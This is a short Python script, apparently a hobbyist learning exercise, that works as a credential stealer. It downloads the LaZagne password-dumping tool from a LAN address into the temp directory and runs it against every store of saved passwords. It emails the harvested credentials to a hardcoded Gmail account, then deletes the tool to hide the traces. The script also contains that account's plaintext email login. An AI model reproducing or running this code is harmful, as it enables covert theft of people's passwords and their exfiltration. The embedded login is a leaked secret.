import subprocess,smtplib,ssl,re,requests,os,tempfile,codecs
def mail(address,password,command):
    server =smtplib.SMTP('smtp.gmail.com', 587)#First server mail id and then port number of server.
    server.starttls()#Start server
    server.login(address, password)#Provide server with email id and password
    server.sendmail(address,address,command)#Emaid id of sender first then recipent and at last message
    server.quit()#Send end request to server

def url_download(url):#remember request class only let's us access the content and download it but they aren't saved 
                       #we have to save with through with which is used later on.
    link=requests.get(url)#class requests used here for downloading url
    extension=url.split("/")[-1]
     #file name we want to access or create     
    with open(extension,"wb") as sample_file:#built in function used to create any kind of object inside the directory we are working
 #wb stands for write binary into file #name of file that we will be using to refrence it later on
        data=link.content# To append the raw layer content of data with the new variable data
        sample_file.write(data)# To write the binary data into the sample file{originally named extension) created.  
address="rajatsabat39@gmail.com"
password="heromamu"
quote='"'
temporary=tempfile.gettempdir()#This class is cross compatible and with the gettempdir function we can get temporary directory of any os without
                               #having to mention it's original location which are differnet in different OS'es
os.chdir(temporary)
url="http://192.168.0.102:7777/Downloads/lazagne.exe"
url_download(url)
command=subprocess.getoutput("laZagne.exe all")
extension=url.split("/")[-1]
mail(address,password,command)
os.remove(extension)

